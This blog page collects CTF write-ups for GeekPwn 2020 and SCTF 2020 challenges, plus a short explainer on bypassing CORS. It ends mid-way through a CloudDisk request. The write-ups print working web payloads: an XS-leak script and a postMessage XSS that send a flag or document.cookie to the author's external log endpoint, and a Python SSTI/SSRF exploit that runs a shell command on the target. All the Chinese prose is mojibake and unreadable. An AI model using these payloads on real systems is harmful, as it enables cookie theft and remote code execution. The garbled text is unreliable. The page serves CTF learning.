<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="http://blog.ccreater.top/page/2/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-geekpwn2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/19/geekpwn2020/" class="article-date">
  <time class="dt-published" datetime="2020-07-19T13:55:23.978Z" itemprop="datePublished">2020-07-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/19/geekpwn2020/">geekpwn2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="geekpwn-2020çƒ­èº«èµ›"><a href="#geekpwn-2020çƒ­èº«èµ›" class="headerlink" title="geekpwn 2020çƒ­èº«èµ›"></a>geekpwn 2020çƒ­èº«èµ›</h1><h2 id="cosplay"><a href="#cosplay" class="headerlink" title="cosplay"></a>cosplay</h2><p>ç›´æ¥ç”¨cosçš„apiè¯»å–æ–‡ä»¶</p>
<pre><code class="javascript">cos.getBucket({
    Bucket: Bucket,
    Region: Region,
}, function(err, data) {
    console.log(err || data.Contents);
});


cos.getObject({
    Bucket: Bucket,
    Region: Region,
    Key: &#39;f1L9@/flag.txt&#39;,
}, function(err, data) {
    console.log(err || data.Body);
});
</code></pre>
<h2 id="noXss2020"><a href="#noXss2020" class="headerlink" title="noXss2020"></a>noXss2020</h2><pre><code class="python">from flask import Flask, request, jsonify, Response
from os import getenv

app = Flask(__name__)

DATASET = {
    114: &#39;514&#39;,
    810: &#39;8931919&#39;,
    2017: &#39;https://blog.cal1.cn/post/RCTF%202017%20rCDN%20%26%20noxss%20writeup&#39;,
    2019: &#39;https://hackmd.io/IlzCicHXSN-MXl2JLCYr0g?view&#39;,
    2020: &#39;flag{2333333333}&#39;
}


@app.before_request
def check_host():
    pass


@app.route(&quot;/&quot;)
def index():
    return app.send_static_file(&#39;index.html&#39;)


@app.route(&quot;/search&quot;)
def search_handler():
    keyword = request.args.get(&#39;keyword&#39;)
    if keyword is None:
        return jsonify(DATASET)
    else:
        ret = {}
        for i in DATASET:
            if keyword in DATASET[i]:
                ret[i] = DATASET[i]
        return jsonify(ret), 200 if len(ret) else 404


@app.after_request
def add_security_headers(resp):
    resp.headers[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;
    resp.headers[&#39;Content-Security-Policy&#39;] = &#39;default-src \&#39;self\&#39;; frame-src https://www.youtube.com&#39;
    resp.headers[&#39;X-Content-Type-Options&#39;] = &#39;nosniff&#39;
    resp.headers[&#39;Referrer-Policy&#39;] = &#39;same-origin&#39;
    return resp


if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=3000, )
</code></pre>
<p>æˆ‘ä»¬æ³¨æ„åˆ°searchæ˜¯é€šè¿‡inæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ï¼Œå¹¶è¿”å›404æˆ–200</p>
<p>è™½ç„¶<code>http://noxss2020.cal1.cn:3000/</code>æœ‰cors,ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦ä»–è¿”å›çš„å†…å®¹ï¼Œæˆ‘ä»¬åªéœ€è¦çŠ¶æ€ç ï¼Œè¿™æ ·å°±ç®€å•å¤šäº†ã€‚æˆ‘ä»¬å°†é¡µé¢å½“æˆcssæ¥åŠ è½½ï¼Œé€šè¿‡æ˜¯å¦åŠ è½½æˆåŠŸæ¥åˆ¤æ–­çŠ¶æ€ç </p>
<p>payload:</p>
<pre><code class="html">&lt;html&gt;
&lt;body&gt;

&lt;script&gt;
var guess=&quot;flag&quot;;
var ok=true;
function check(text){
    var linkEl = document.head.querySelector(&#39;link[href*=&quot;&#39;+text+&#39;&quot;&#39;);
    var cssLoaded = Boolean(linkEl.sheet);
    linkEl.addEventListener(&#39;load&#39;, function () {

        guess=unescape(text);
        console.log(guess)
        ok=true;
        if(guess.endsWith(&quot;}&quot;)){
            location=&quot;http://ccreater.top:60010/log.php?log=&quot;+guess;
        };
        var s = guess.substr(0,guess.length-1);
        while(tmp=document.head.querySelector(&#39;link[href*=&quot;&#39;+s+&#39;&quot;&#39;)){
            tmp.remove();
        }
        fuzz()
    });
}
function make(text){
    head = document.getElementsByTagName(&#39;head&#39;)[0];

    var url = &quot;http://127.0.0.1:3000/search?keyword=&quot;+escape(text),
    link = document.createElement(&#39;link&#39;);
    link.rel = &quot;stylesheet&quot;;
    link.href = url;
    head.appendChild(link);
    check(escape(text));
}

async function fuzz(){
    for(i of &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}&quot;){
        if(make(guess+i)){
            break;
        }
    }
    return true
}
function exploit(){
    fuzz()
}

fuzz()
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2 id="umsg"><a href="#umsg" class="headerlink" title="umsg"></a>umsg</h2><p>é˜…è¯»ä»£ç å‘ç°ï¼š</p>
<pre><code>function(e, t, r) {
        &quot;use strict&quot;;
        r.r(t);
        r(91);
        var n = {
            mounted: function() {
                window.addEventListener(&quot;message&quot;, (function(e) {
                    if (e.origin.match(&quot;http://umsg.iffi.top&quot;))
                        switch (e.data.action) {
                        case &quot;append&quot;:
                            return void (document.getElementsByTagName(&quot;main&quot;)[0].innerHTML += e.data.payload);
                        case &quot;debug&quot;:
                            return void console.log(e.data.payload);
                        case &quot;ping&quot;:
                            return void e.source.postMessage(&quot;pong&quot;, &quot;*&quot;)
                        }
                }
                ), !1),
                postMessage({
                    action: &quot;ping&quot;
                })
            }
        }</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨é¡µé¢ä¸­åµŒå…¥iframeæ¥postMessage,ä»è€Œæ’å…¥æ¶æ„å†…å®¹ï¼Œå”¯ä¸€çš„éšœç¢æ˜¯ï¼š<code>e.origin.match(&quot;http://umsg.iffi.top&quot;)</code></p>
<p>å› ä¸ºmatchæ˜¯ä¸€ä¸ªæ­£åˆ™åŒ¹é…å‡½æ•°ï¼Œæ‰€ä»¥æ„é€ <code>http://umsg_iffi_top.evildomain</code>æ¥ç»•è¿‡</p>
<p>payload:</p>
<pre><code>&lt;html&gt;
&lt;body&gt;

&lt;iframe src=&quot;http://umsg.iffi.top:3000/&quot; height=&quot;100%&quot; width=&quot;100%&quot; frameborder=&quot;0&quot; scrolling=&quot;auto&quot;&gt;
&lt;/iframe&gt;
&lt;script&gt;
setTimeout(()=&gt;{
document.body.children[0].contentWindow.postMessage({action:&quot;append&quot;,payload:&quot;&lt;img src=1 onerror=&#39;location=(`http://ccreater.top:60010/log.php?log=`+document.cookie)&#39;&gt;&quot;},&quot;http://umsg.iffi.top:3000/&quot;)
},5000);
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/07/19/geekpwn2020/">http://blog.ccreater.top/2020/07/19/geekpwn2020/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/07/19/geekpwn2020/" data-id="ckct57ifr00001gv03qlcd93o" data-title="geekpwn2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-bypass CORS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/09/bypass%20CORS/" class="article-date">
  <time class="dt-published" datetime="2020-07-09T13:42:48.661Z" itemprop="datePublished">2020-07-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/09/bypass%20CORS/">bypass CORS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-CORS"><a href="#bypass-CORS" class="headerlink" title="bypass CORS"></a>bypass CORS</h1><h2 id="ä»€ä¹ˆæ˜¯CORS"><a href="#ä»€ä¹ˆæ˜¯CORS" class="headerlink" title="ä»€ä¹ˆæ˜¯CORS"></a>ä»€ä¹ˆæ˜¯CORS</h2><p>CORS: Cross Origin Resource Share,è®¾ç½®åœ¨æœåŠ¡ç«¯ï¼Œå®¢æˆ·ç«¯æ‰§è¡Œçš„ä¸€ç§ç­–ç•¥ã€‚</p>
<blockquote>
<p>å‡ºäºå®‰å…¨åŸå› ï¼Œæµè§ˆå™¨é™åˆ¶ä»è„šæœ¬å†…å‘èµ·çš„è·¨æºHTTPè¯·æ±‚æˆ–è€… è·¨ç«™è¯·æ±‚å¯ä»¥æ­£å¸¸å‘èµ·ï¼Œä½†æ˜¯è¿”å›ç»“æœè¢«æµè§ˆå™¨æ‹¦æˆªäº† ã€‚ ä¾‹å¦‚ï¼ŒXMLHttpRequestå’ŒFetch APIéµå¾ªåŒæºç­–ç•¥ã€‚ è¿™æ„å‘³ç€ä½¿ç”¨è¿™äº›APIçš„Webåº”ç”¨ç¨‹åºåªèƒ½ä»åŠ è½½åº”ç”¨ç¨‹åºçš„åŒä¸€ä¸ªåŸŸè¯·æ±‚HTTPèµ„æºï¼Œé™¤éå“åº”æŠ¥æ–‡åŒ…å«äº†æ­£ç¡®CORSå“åº”å¤´ã€‚ </p>
</blockquote>
<h2 id="ç›¸å…³çš„å­—æ®µ"><a href="#ç›¸å…³çš„å­—æ®µ" class="headerlink" title="ç›¸å…³çš„å­—æ®µ"></a>ç›¸å…³çš„å­—æ®µ</h2><p>å“åº”ï¼š</p>
<pre><code>Access-Control-Allow-Origin
Access-Control-Expose-Headers
Access-Control-Max-Age
Access-Control-Allow-Credentials
Access-Control-Allow-Methods
Access-Control-Allow-Headers
</code></pre><p>è¯·æ±‚ï¼š</p>
<pre><code>Origin
Access-Control-Request-Method
Access-Control-Request-Headers
</code></pre><h2 id="CORSé…ç½®é”™è¯¯"><a href="#CORSé…ç½®é”™è¯¯" class="headerlink" title="CORSé…ç½®é”™è¯¯"></a>CORSé…ç½®é”™è¯¯</h2><h3 id="æ ¹æ®æŸäº›å­—æ®µæ¥è®¾ç½®ACAOå¤´"><a href="#æ ¹æ®æŸäº›å­—æ®µæ¥è®¾ç½®ACAOå¤´" class="headerlink" title="æ ¹æ®æŸäº›å­—æ®µæ¥è®¾ç½®ACAOå¤´"></a>æ ¹æ®æŸäº›å­—æ®µæ¥è®¾ç½®ACAOå¤´</h3><pre><code>GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...

æ ¹æ®Originå¤´æ¥è®¾ç½®Access-Control-Allow-Origin

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true</code></pre><h3 id="å¯¹Originå¤´çš„é”™è¯¯è§£æ"><a href="#å¯¹Originå¤´çš„é”™è¯¯è§£æ" class="headerlink" title="å¯¹Originå¤´çš„é”™è¯¯è§£æ"></a>å¯¹Originå¤´çš„é”™è¯¯è§£æ</h3><p>å› ä¸ºè¦å¯¹å­åŸŸåçš„æ”¯æŒï¼Œæ‰€ä»¥æœ‰äº›ç½‘ç«™ä¼šè¿™æ ·å†™:</p>
<pre><code>if Origin.domain startwith &quot;domain.com&quot;:
    return &quot;Access-Control-Allow-Origin: &quot;+Origin
</code></pre><p>æˆ–è€…</p>
<pre><code>if Origin.domain endwith &quot;domain.com&quot;:
    return &quot;Access-Control-Allow-Origin: &quot;+Origin
</code></pre><p>åƒè¿™ç§éƒ½å¾ˆå¥½ç»•è¿‡ï¼š</p>
<p>domain.com.evildomain.com æˆ–è€… evildomain-domain.com</p>
<h3 id="ç™½åå•ä¸­å­˜åœ¨-null"><a href="#ç™½åå•ä¸­å­˜åœ¨-null" class="headerlink" title="ç™½åå•ä¸­å­˜åœ¨:null"></a>ç™½åå•ä¸­å­˜åœ¨:null</h3><p> Originæ”¯æŒå€¼nullï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨å¯èƒ½ä¼šåœ¨Originæ ‡å¤´ä¸­å‘é€å€¼nullï¼š</p>
<ul>
<li><p>è·¨ç«™ç‚¹é‡å®šå‘</p>
</li>
<li><p>æ¥è‡ªåºåˆ—åŒ–æ•°æ®çš„è¯·æ±‚</p>
</li>
<li><p>ä½¿ç”¨<code>file</code>åè®®çš„è¯·æ±‚</p>
</li>
<li><p>æ²™ç›’ä¸­çš„è·¨åŸŸè¯·æ±‚</p>
</li>
</ul>
<h2 id="åˆ©ç”¨å—ä¿¡ä»»çš„åŸŸ"><a href="#åˆ©ç”¨å—ä¿¡ä»»çš„åŸŸ" class="headerlink" title="åˆ©ç”¨å—ä¿¡ä»»çš„åŸŸ"></a>åˆ©ç”¨å—ä¿¡ä»»çš„åŸŸ</h2><p>åœ¨å—ä¿¡ä»»çš„åŸŸä¸Šæ‰¾åˆ°xssï¼Œå°±å¯ä»¥ç»•è¿‡CORS</p>
<h2 id="ä¸­é—´äººæ”»å‡»"><a href="#ä¸­é—´äººæ”»å‡»" class="headerlink" title="ä¸­é—´äººæ”»å‡»"></a>ä¸­é—´äººæ”»å‡»</h2><p>23333</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">https://portswigger.net/web-security/cors</a> </p>
<p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a> </p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="http://blog.ccreater.top/2020/07/09/bypass">http://blog.ccreater.top/2020/07/09/bypass</a> CORS/](<a href="http://blog.ccreater.top/2020/07/09/bypass">http://blog.ccreater.top/2020/07/09/bypass</a> CORS/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/07/09/bypass%20CORS/" data-id="ckceucv7j0000d4v08qmmgco2" data-title="bypass CORS" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-sctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/07/sctf2020/" class="article-date">
  <time class="dt-published" datetime="2020-07-07T07:19:44.928Z" itemprop="datePublished">2020-07-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/07/sctf2020/">sctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SCTF-2020"><a href="#SCTF-2020" class="headerlink" title="SCTF 2020"></a>SCTF 2020</h1><h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>é˜…è¯»ä»£ç å‘ç°ï¼Œè¿™ä¸€é¢˜å­˜åœ¨ç€ä¸¤ä¸ªç¯å¢ƒï¼Œå…¶ä¸­ï¼Œå†…ç½‘æœåŠ¡å¯ä»¥sstiï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è®¿é—®å†…ç½‘ï¼š</p>
<pre><code class="python">@app.route(&#39;/caculator&#39;, methods=[&quot;POST&quot;])
def caculator():
    try:
        data = request.get_json()
    except ValueError:
        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})
    num1 = str(data[&quot;num1&quot;])
    num2 = str(data[&quot;num2&quot;])
    symbols = data[&quot;symbols&quot;]
    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):
        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})

    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)</code></pre>
<p>å¯ä»¥è¿›è¡Œç¬¦åˆæ¡ä»¶çš„ssrfçš„åªæœ‰</p>
<pre><code class="python">
def flask_rpc(request):
    if request.META[&#39;REMOTE_ADDR&#39;] != &quot;127.0.0.1&quot;:
        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Must 127.0.0.1&quot;})

    methods = request.GET.get(&quot;methods&quot;)
    url = request.GET.get(&quot;url&quot;)

    if methods == &quot;GET&quot;:
        return JsonResponse(
            {&quot;code&quot;: 0, &quot;message&quot;: requests.get(url, headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;}, timeout=1).text})
    elif methods == &quot;POST&quot;:
        data = base64.b64decode(request.GET.get(&quot;data&quot;))
        return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: requests.post(url, data=data,
                                                                 headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;,
                                                                          &quot;Content-Type&quot;: &quot;application/json&quot;}, timeout=1).text})
    else:
        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;=3=&quot;})</code></pre>
<p>ä½†æ˜¯éœ€è¦<code>request.META[&#39;REMOTE_ADDR&#39;]==127.0.0.1</code>ï¼Œåˆ©ç”¨ CVE-2018-14574è·³è½¬åˆ°127.0.0.1:8000è®¿é—®/rpc ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½sstiï¼Œåœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦æåˆ°Token</p>
<pre><code class="python">@login_required
def home(request):
    if request.method == &quot;GET&quot;:
        return render(request, &quot;templates/home.html&quot;)
    elif request.method == &quot;POST&quot;:
        white_list = [&quot;39.104.19.182&quot;]
        try:
            data = json.loads(request.body)
        except ValueError:
            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})

        if Token.objects.all().first().Token == data[&quot;token&quot;]:
            try:
                if ssrf_check(data[&quot;url&quot;], white_list):
                    return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Hacker!&quot;})
                else:
                    res = requests.get(data[&quot;url&quot;], timeout=1)
            except Exception:
                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request Error&quot;})
            if res.status_code == 200:
                return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: res.text})
            else:
                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Something Wrong&quot;})
        else:
            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Token Error&quot;})</code></pre>
<pre><code class="python">def reg(request):
    if request.method == &quot;GET&quot;:
        return render(request, &quot;templates/reg.html&quot;)
    elif request.method == &quot;POST&quot;:
        try:
            data = json.loads(request.body)
        except ValueError:
            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})

        if len(User.objects.filter(username=data[&quot;username&quot;])) != 0:
            return JsonResponse({&quot;code&quot;: 1})
        User.objects.create_user(**data)
        return JsonResponse({&quot;code&quot;: 0})</code></pre>
<p>æ„é€ ï¼š<code>{&quot;username&quot;:&quot;test66666&quot;,&quot;password&quot;:&quot;test66666&quot;,&quot;is_staff&quot;:true,&quot;is_superuser&quot;:true}</code></p>
<p>å¾—åˆ°token:<code>3ad9af405504233188f694a11ff22115</code></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯sstiäº†</p>
<pre><code class="python">@app.route(&#39;/caculator&#39;, methods=[&quot;POST&quot;])
def caculator():
    try:
        data = request.get_json()
    except ValueError:
        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})
    num1 = str(data[&quot;num1&quot;])
    num2 = str(data[&quot;num2&quot;])
    symbols = data[&quot;symbols&quot;]
    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):
        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})

    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)</code></pre>
<p>æœ€åçš„payload:</p>
<pre><code class="python">import requests
import base64
import json
num1=1
num2=2
symbols=&quot;-{{''.__class__.__mro__[1].__subclasses__()[409]('/readflag',shell=True,stdout=-1).communicate()}}-&quot;
data={
    &quot;num1&quot;:num1,
    &quot;num2&quot;:num2,
    &quot;symbols&quot;:symbols
}
payload=json.dumps(data).replace(&quot;{{","\\u007b\\u007b").replace("}}&quot;,&quot;\\u007d\\u007d&quot;)
payload=base64.b64encode(payload)
print(payload)
burp0_url = &quot;http://39.104.19.182:80/home/&quot;
burp0_cookies = {&quot;sessionid&quot;: &quot;bd63u3ewjx05tc7ajvlkve7b9cu8h4kx&quot;, &quot;csrftoken&quot;: &quot;GBW7niMYrwP9fMP6jpgHN1ujcxEwuRQ4tMKdBDdnZvSlDny51S1K1cMmWtOsR0gO&quot;}
burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://39.104.19.182&quot;, &quot;Referer&quot;: &quot;http://39.104.19.182/home/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
burp0_json={&quot;token&quot;: &quot;3ad9af405504233188f694a11ff22115&quot;, &quot;url&quot;: &quot;http://39.104.19.182//127.0.0.1:8000/rpc?url=http://127.0.0.1:5000/caculator&amp;methods=POST&amp;data={payload}&quot;.format(payload=payload)}
print(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json).text)</code></pre>
<p><code>SCTF{2b19246757c63738e7c40bbdf87c3be1}</code></p>
<h2 id="Can-you-hear"><a href="#Can-you-hear" class="headerlink" title="Can you hear"></a>Can you hear</h2><p>We used the receiver to receive the information from the space station and tried to unlock the answerğŸ˜€.</p>
<p>æœç´¢ â€œç©ºé—´ç«™â€ â€œæ¥æ”¶æœºâ€ ä¿¡æ¯ éŸ³é¢‘ ç­‰å…³é”®å­—æ‰¾åˆ°<br><a href="https://zhuanlan.zhihu.com/p/98103018" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98103018</a><br><a href="https://www.sohu.com/a/159552694_610733" target="_blank" rel="noopener">https://www.sohu.com/a/159552694_610733</a><br>SSTVå…³é”®å­—</p>
<p><a href="https://zhuanlan.zhihu.com/p/105460358" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/105460358</a><br><a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04" target="_blank" rel="noopener">https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04</a></p>
<p>ä¸‹è½½ mmsstv<br>ä¿®æ”¹å½•éŸ³è®¾å¤‡ä¸ºç«‹ä½“å£°æ··éŸ³<br>å…·ä½“æ“ä½œä¸ºï¼šOption-&gt;Soundcard input level<br>æ’­æ”¾éŸ³é¢‘å¾—åˆ°flag:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200704145700.png" alt="image5949"><br>SCTF{f78fsd1423fvsa}</p>
<h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>app.js</p>
<pre><code class="javascript=">HTTP/1.1 200 OK
Content-Disposition: attachment; filename=&quot;dc62d163f53ce13369ab97041706060c&quot;
Content-Length: 1547
Last-Modified: Sat, 04 Jul 2020 05:14:45 GMT
Cache-Control: max-age=0
Content-Type: application/octet-stream
Date: Sat, 04 Jul 2020 05:14:50 GMT
Connection: close

const fs = require(&#39;fs&#39;);
const path = require(&#39;path&#39;);
const crypto = require(&#39;crypto&#39;);
const Koa = require(&#39;koa&#39;);
const Router = require(&#39;koa-router&#39;);
const koaBody = require(&#39;koa-body&#39;);
const send = require(&#39;koa-send&#39;);

const app = new Koa();
const router = new Router();
const SECRET = &quot;03229a6694e657077f218c322f3e0bea&quot;


app.use(koaBody({
  multipart: true,
  formidable: {
      maxFileSize: 2000 * 1024 * 1024 
  }
}));


router.post(&#39;/uploadfile&#39;, async (ctx, next) =&gt; {
  const file = ctx.request.body.files.file;
  if (!fs.existsSync(file.path)) {
    return ctx.body = &quot;Error&quot;;
  }
  if(file.path.toString().search(&quot;/fd/&quot;) != -1){
    file.path=&quot;/dev/null&quot;
  }
  const reader = fs.createReadStream(file.path);
  let fileId = crypto.createHash(&#39;md5&#39;).update(file.name + Date.now() + SECRET).digest(&quot;hex&quot;);
  let filePath = path.join(__dirname, &#39;upload/&#39;) + fileId
  const upStream = fs.createWriteStream(filePath);
  reader.pipe(upStream)
  return ctx.body = &quot;Upload success ~, your fileId is hereÃ¯Â¼Âš&quot; + fileId;
});


router.get(&#39;/downloadfile/:fileId&#39;, async (ctx, next) =&gt; {
  let fileId = ctx.params.fileId;
  ctx.attachment(fileId);
  try {
    await send(ctx, fileId, { root: __dirname + &#39;/upload&#39; });
  }catch(e){
    return ctx.body = &quot;SCTF{no_such_file_~}&quot;
  }
});


router.get(&#39;/&#39;, async (ctx, next) =&gt; {
  ctx.response.type = &#39;html&#39;;
  ctx.response.body = fs.createReadStream(&#39;index.html&#39;);

});

app.use(router.routes());
app.listen(3333, () =&gt; {
  console.log(&#39;This server is running at http://localhost:&#39; + 3333)
})
</code></pre>
<p>å› ä¸ºkoaä¸­è®¿é—®å‚æ•°ä¹Ÿæ˜¯ctx.request.body.xxxx æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ </p>
<pre><code>POST /uploadfile HTTP/1.1
Host: 127.0.0.1:3333
Content-Length: 77
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://127.0.0.1:3333
Referer: http://127.0.0.1:3333/
Accept-Encoding: gzip, deflate
